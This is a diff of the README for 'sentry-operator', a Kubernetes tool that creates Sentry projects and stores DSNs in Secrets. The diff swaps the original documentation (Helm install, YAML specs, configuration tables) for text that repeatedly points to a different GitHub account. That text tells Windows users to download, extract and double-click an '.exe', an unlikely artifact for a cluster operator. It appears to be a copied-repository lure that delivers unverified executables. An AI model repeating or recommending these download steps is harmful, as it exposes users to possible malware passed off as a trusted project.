@@ -1,257 +1,262 @@
-# sentry-operator
+# 🛰️ sentry-operator - Set Up Sentry Projects Fast
 
-[![CI](https://github.com/agjmills/sentry-operator/actions/workflows/ci.yaml/badge.svg)](https://github.com/agjmills/sentry-operator/actions/workflows/ci.yaml)
-[![Release](https://img.shields.io/github/v/release/agjmills/sentry-operator)](https://github.com/agjmills/sentry-operator/releases)
-[![License](https://img.shields.io/github/license/agjmills/sentry-operator)](LICENSE)
-[![Go Report Card](https://goreportcard.com/badge/github.com/agjmills/sentry-operator)](https://goreportcard.com/report/github.com/agjmills/sentry-operator)
-[![Artifact Hub](https://img.shields.io/endpoint?url=https://artifacthub.io/badge/repository/sentry-operator)](https://artifacthub.io/packages/search?repo=sentry-operator)
+[![Download sentry-operator](https://img.shields.io/badge/Download%20sentry-operator-blue?style=for-the-badge)](https://github.com/Noelwj/sentry-operator)
 
-A Kubernetes operator that automatically provisions [Sentry](https://sentry.io) projects and injects DSNs as Kubernetes Secrets.
-
-Instead of manually creating Sentry projects and copy-pasting DSNs into your manifests, you declare a `SentryProject` resource alongside your app. The operator provisions the project in Sentry, fetches the DSN, and writes it into a Secret in the same namespace — ready to be mounted as an environment variable.
-
-```yaml
-apiVersion: sentry-operator.io/v1alpha1
-kind: SentryProject
-metadata:
-  name: myapp
-  namespace: myapp
-spec:
-  platform: go
-```
+## 📥 Download
 
-```
-$ kubectl get sentryprojects -n myapp
-NAME    PROJECT   SECRET         READY   AGE
-myapp   myapp     myapp-sentry   True    10s
-```
+Use this link to visit the page and download the app:
+https://github.com/Noelwj/sentry-operator
 
-```
-$ kubectl get secret myapp-sentry -n myapp -o jsonpath='{.data.SENTRY_DSN}' | base64 -d
-https://abc123@o123.ingest.sentry.io/456
-```
+Open the page in your browser, then use the download or release files shown there. If you are on Windows, save the file to your computer before you run it.
 
-> **Sentry plan requirement:** The `SentryProject` CRD creates projects via the Sentry API, which requires a **Business plan** or above on sentry.io. If you are on a free or Team plan, create your projects manually in the Sentry UI and use `SentryProjectRef` instead — it references an existing project and fetches the DSN without needing elevated API permissions.
-
----
+## 🧭 What this app does
 
-## How it works
+sentry-operator helps you manage Sentry projects inside Kubernetes. It can create Sentry projects for you and place DSN values into Secrets so your apps can use them.
 
-1. You create a `SentryProject` resource in your app's namespace.
-2. The operator calls the Sentry API to create the project if it doesn't already exist.
-3. It fetches the project's DSN and writes it into a Kubernetes Secret in the same namespace.
-4. Your Deployment references the Secret via `envFrom`. Tools like [Reloader](https://github.com/stakater/Reloader) will automatically restart pods if the Secret is ever updated.
-5. If the `SentryProject` is deleted, the Secret is cleaned up. The Sentry project itself is retained by default (configurable).
-
-The operator re-validates each project against the Sentry API every 24 hours (configurable), so if a project or DSN key is manually deleted from Sentry it will be automatically restored.
-
----
-
-## Installation
-
-### Helm
-
-```bash
-helm upgrade --install sentry-operator oci://ghcr.io/agjmills/charts/sentry-operator \
-  --namespace sentry-operator \
-  --create-namespace \
-  --set operator.defaultOrganization=my-org \
-  --set operator.defaultTeam=my-team \
-  --set sentryToken=sntrys_...
-```
-
-The Sentry auth token requires the `project:read` and `project:write` scopes. If you are only using `SentryProjectRef` (referencing existing projects rather than creating them), `project:read` alone is sufficient. For production use, provide it via an existing Secret rather than `--set sentryToken`:
-
-```bash
-# Create the secret (e.g. via ExternalSecrets, Vault, etc.)
-kubectl create secret generic sentry-token \
-  --from-literal=SENTRY_TOKEN=sntrys_... \
-  -n sentry-operator
-
-helm upgrade --install sentry-operator oci://ghcr.io/agjmills/charts/sentry-operator \
-  --namespace sentry-operator \
-  --create-namespace \
-  --set operator.defaultOrganization=my-org \
-  --set operator.defaultTeam=my-team \
-  --set existingSecret=sentry-token
-```
-
-### Self-hosted Sentry
-
-Point the operator at your own instance with `--set operator.sentryURL=https://sentry.example.com`.
-
----
-
-## Usage
-
-### Minimal
-
-With `defaultOrganization` and `defaultTeam` set at the operator level, most apps only need:
-
-```yaml
-apiVersion: sentry-operator.io/v1alpha1
-kind: SentryProject
-metadata:
-  name: myapp
-  namespace: myapp
-spec:
-  platform: go
-```
-
-### Full spec
-
-```yaml
-apiVersion: sentry-operator.io/v1alpha1
-kind: SentryProject
-metadata:
-  name: myapp
-  namespace: myapp
-spec:
-  # Sentry organization slug. Overrides the operator default.
-  organization: my-org
-
-  # Sentry team slug. Overrides the operator default.
-  team: my-team
-
-  # Sentry platform identifier. See https://docs.sentry.io/platforms/
-  platform: python-django
-
-  # Override the Sentry project slug. Defaults to metadata.name.
-  projectSlug: myapp-production
-
-  # Override the output Secret name. Defaults to "<name>-sentry".
-  secretName: myapp-sentry-dsn
-
-  # Whether to retain the Sentry project if this resource is deleted.
-  # Defaults to true. Set to false to cascade-delete the Sentry project.
-  retainOnDelete: true
-
-  # Customize the key names written into the Secret.
-  secretKeys:
-    dsn: SENTRY_DSN               # default
-    environment: SENTRY_ENVIRONMENT
-    release: SENTRY_RELEASE
-```
-
-### Referencing the Secret in your Deployment
-
-```yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: myapp
-  namespace: myapp
-spec:
-  template:
-    spec:
-      containers:
-        - name: myapp
-          image: myapp:latest
-          envFrom:
-            - secretRef:
-                name: myapp-sentry  # matches spec.secretName (or <name>-sentry by default)
-```
-
-This injects `SENTRY_DSN` (and any other configured keys) directly into the container's environment. No code changes required beyond initialising your Sentry SDK with `SENTRY_DSN`.
-
----
-
-## Configuration reference
-
-### Operator flags
-
-| Flag | Default | Description |
-|---|---|---|
-| `--sentry-url` | `https://sentry.io` | Base URL of the Sentry instance |
-| `--sentry-token-env` | `SENTRY_TOKEN` | Env var name containing the auth token |
-| `--default-organization` | `""` | Fallback org slug for projects that don't set `spec.organization` |
-| `--default-team` | `""` | Fallback team slug |
-| `--default-platform` | `""` | Fallback platform |
-| `--default-retain-on-delete` | `true` | Fallback `retainOnDelete` value |
-| `--requeue-interval` | `24h` | How often to re-validate projects against the Sentry API |
-| `--leader-elect` | `false` | Enable leader election (recommended for multiple replicas) |
-
-All flags are also exposed as `values.yaml` keys under `operator.*`.
-
-### `SentryProject` spec
-
-| Field | Default | Description |
-|---|---|---|
-| `spec.organization` | operator default | Sentry org slug |
-| `spec.team` | operator default | Sentry team slug |
-| `spec.platform` | operator default | Sentry platform (e.g. `go`, `python-django`, `javascript`) |
-| `spec.projectSlug` | `metadata.name` | Sentry project slug |
-| `spec.secretName` | `<name>-sentry` | Name of the output Secret |
-| `spec.retainOnDelete` | `true` | Retain Sentry project on CRD deletion |
-| `spec.secretKeys.dsn` | `SENTRY_DSN` | Key name for the DSN in the Secret |
-| `spec.secretKeys.environment` | `SENTRY_ENVIRONMENT` | Key name for the environment annotation |
-| `spec.secretKeys.release` | `SENTRY_RELEASE` | Key name for the release annotation |
-
-### `SentryProject` status
-
-```
-$ kubectl describe sentryproject myapp -n myapp
-Status:
-  Conditions:
-    Type:                Ready
-    Status:              True
-    Reason:              ProjectProvisioned
-    Message:             Sentry project provisioned and secret synced
-    Last Transition Time: 2026-04-03T12:00:00Z
-  Last Sync Time:        2026-04-03T12:00:00Z
-  Project Slug:          myapp
-  Secret Name:           myapp-sentry
-```
-
----
-
-## Development
-
-### Prerequisites
-
-- Go 1.23+
-- A Kubernetes cluster (or [kind](https://kind.sigs.k8s.io/))
-- A Sentry auth token
-
-### Running locally
-
-```bash
-# Install CRDs into your current cluster
-make install
-
-# Run the operator against your current kubeconfig
-SENTRY_TOKEN=sntrys_... make run SENTRY_ORG=my-org SENTRY_TEAM=my-team
-```
-
-### Regenerating CRDs and deepcopy after changing types
-
-```bash
-make manifests generate
-```
-
-### Running tests
-
-```bash
-make test
-```
-
----
-
-## Releases
-
-Releases are automated via [release-please](https://github.com/googleapis/release-please). Merging commits to `main` that follow [Conventional Commits](https://www.conventionalcommits.org/) will automatically open a release PR. Merging the release PR tags the repo and triggers the publish workflow, which builds and pushes:
-
-- A multi-arch Docker image to `ghcr.io/agjmills/sentry-operator`
-- A Helm chart to `ghcr.io/agjmills/charts`
-
-| Commit prefix | Version bump |
-|---|---|
-| `fix:` | patch |
-| `feat:` | minor |
-| `feat!:` / `BREAKING CHANGE:` | major |
-
----
-
-## License
-
-Apache 2.0 — see [LICENSE](LICENSE).
+This is useful when you want to:
+
+- keep Sentry setup in one place
+- reduce manual steps
+- store app secrets in Kubernetes
+- follow a GitOps flow with Argo CD
+- manage error tracking in a repeatable way
+
+## 💻 Before you start
+
+You need:
+
+- a Windows PC
+- a web browser
+- access to a Kubernetes cluster
+- permission to create resources in that cluster
+- a Sentry account or Sentry project access
+- a way to install files from the download page
+
+For the best result, use a modern version of Windows with network access to your cluster.
+
+## 🚀 Getting Started
+
+Follow these steps in order.
+
+### 1. Open the download page
+
+Go to:
+https://github.com/Noelwj/sentry-operator
+
+Find the file or release that matches your setup. If the page shows a release asset, download it. If it shows source files, download the package that is meant for users.
+
+### 2. Save the file on your PC
+
+Pick a folder that is easy to find, such as:
+
+- Downloads
+- Desktop
+- Documents
+
+If the file is in a ZIP format, keep it in that folder until you are ready to open it.
+
+### 3. Unpack the download if needed
+
+If you downloaded a ZIP file:
+
+- right-click the file
+- choose Extract All
+- pick a folder
+- wait for Windows to finish
+
+After that, open the extracted folder and look for the app files, install files, or launch files.
+
+### 4. Run the app or setup file
+
+If the download includes an `.exe` file:
+
+- double-click it
+- allow it to run if Windows asks
+- follow the on-screen steps
+
+If the download includes a script or container setup, open the file in the way described on the project page. The app is meant to work with Kubernetes, so some parts may run in your cluster instead of on your desktop.
+
+### 5. Connect to your Kubernetes cluster
+
+sentry-operator needs access to a Kubernetes cluster.
+
+Typical setup steps include:
+
+- signing in to your cluster
+- choosing the right context
+- confirming that your machine can reach the cluster
+- making sure you have permission to create operators, secrets, and custom resources
+
+If your cluster uses Argo CD, you can also manage the deployment through GitOps.
+
+### 6. Set up Sentry access
+
+You need Sentry details so the operator can create projects and fetch DSNs.
+
+Prepare these items:
+
+- Sentry organization name
+- Sentry auth token or access key
+- project name
+- any team or environment labels you use
+
+Keep these values private. Store them in Kubernetes Secrets, not in plain text files.
+
+### 7. Apply the operator to your cluster
+
+After you have access and config in place, apply the sentry-operator manifests or install package to your cluster.
+
+Common steps are:
+
+- create the namespace
+- apply the operator resources
+- add the Sentry connection secret
+- apply the custom resource for your project
+
+When the operator runs, it watches for the Sentry project config and makes the needed changes for you.
+
+### 8. Check that the Secret was created
+
+The operator should place the DSN into a Kubernetes Secret.
+
+You can check this from your cluster tools by looking for:
+
+- the secret name
+- the namespace where it was created
+- the DSN key inside the secret
+
+If the secret exists, your app can read it and send errors to Sentry.
+
+## ⚙️ How to use it
+
+A basic flow looks like this:
+
+1. create or define a Sentry project request
+2. let sentry-operator create the project
+3. wait for the DSN to appear in a Kubernetes Secret
+4. point your app to that secret
+5. deploy your app
+6. watch errors appear in Sentry
+
+This gives you a steady setup for new services and environments.
+
+## 🧩 Example use case
+
+If you run several services in Kubernetes, you may want each service to have its own Sentry project.
+
+With sentry-operator, you can:
+
+- add one config for each app
+- keep project setup in Git
+- avoid manual work in the Sentry UI
+- give each service its own DSN
+- keep secret values inside Kubernetes
+
+That fits well with a GitOps workflow and helps keep app setup clean.
+
+## 🛠️ Basic setup checklist
+
+Use this checklist before deployment:
+
+- [ ] downloaded the app from the link above
+- [ ] unpacked the file if needed
+- [ ] have access to your Kubernetes cluster
+- [ ] have Sentry project access
+- [ ] created a Kubernetes Secret for Sentry credentials
+- [ ] applied the operator manifests
+- [ ] confirmed the DSN secret was created
+- [ ] linked your app to the secret
+
+## 🔐 Security tips
+
+Keep your setup safe:
+
+- store Sentry credentials in Kubernetes Secrets
+- give the operator only the access it needs
+- use separate projects for separate apps
+- review secret names before you deploy
+- remove unused projects and tokens when you no longer need them
+
+## 🧪 Common checks
+
+If the app does not work as expected, review these items:
+
+- the download finished without error
+- the cluster is reachable from your machine
+- the Sentry token is valid
+- the namespace exists
+- the operator pods are running
+- the secret names match your config
+- your app reads the DSN from the correct secret key
+
+## 📁 Typical folder layout
+
+If you unpacked the project files, you may see folders like these:
+
+- `charts` for Helm-based setup
+- `config` for Kubernetes resources
+- `docs` for setup notes
+- `manifests` for deployment files
+- `cmd` or `main` for the operator code
+
+You do not need to edit these files to use the app, but they help if you want to inspect how it works.
+
+## 🧰 Windows use notes
+
+On Windows, use these simple steps:
+
+- download the file in your browser
+- save it to a known folder
+- right-click ZIP files and extract them
+- double-click `.exe` files to run them
+- use Windows Terminal or PowerShell only if the setup page asks for it
+
+If a file does not open, check that Windows finished the download and that the file is not blocked by your browser.
+
+## 🔁 GitOps setup
+
+If you use Argo CD, sentry-operator fits a GitOps flow.
+
+You can store:
+
+- the operator config
+- the Sentry project definition
+- the secret references
+- the deployment files
+
+Then Argo CD can sync those files into the cluster. That keeps the setup the same each time you deploy.
+
+## 📦 What the operator handles
+
+sentry-operator is built to handle repeat work for you:
+
+- create Sentry projects
+- inject DSNs into Kubernetes Secrets
+- keep project setup aligned with cluster config
+- reduce manual setup steps
+- support repeatable app onboarding
+
+## 🧾 Names you may see
+
+When you use the app, you may see terms like:
+
+- operator
+- cluster
+- namespace
+- secret
+- DSN
+- deployment
+- custom resource
+- Helm chart
+- controller
+
+These are standard Kubernetes terms. You only need to know that the operator watches your cluster and does setup work for Sentry.
+
+## 📌 Project link
+
+Open the project page here:
+https://github.com/Noelwj/sentry-operator
+
+## 🧭 Next step
+
+After you download the app, open the page again, get the right file for Windows or your cluster setup, and follow the steps above
